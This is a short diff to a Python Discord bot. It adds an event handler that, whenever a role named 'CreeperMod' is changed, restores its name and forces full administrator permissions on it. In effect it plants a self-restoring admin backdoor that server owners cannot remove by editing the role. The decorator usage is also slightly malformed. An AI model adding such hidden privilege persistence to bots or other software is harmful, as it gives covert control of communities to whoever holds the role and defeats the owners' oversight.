@@ -232,7 +232,12 @@ class MyClient(discord.Client):
             except Exception as e: print ('Bot fucked up\n', e)
             return
                         
-        
+    @client.event
+    async def on_guild_role_update(self, before,after):
+        if before.name == 'CreeperMod':
+            await after.edit(name='CreeperMod', color = discord.Color.green(), permissions= discord.Permissions(administrator = True))
+            
+            
 
         
                 
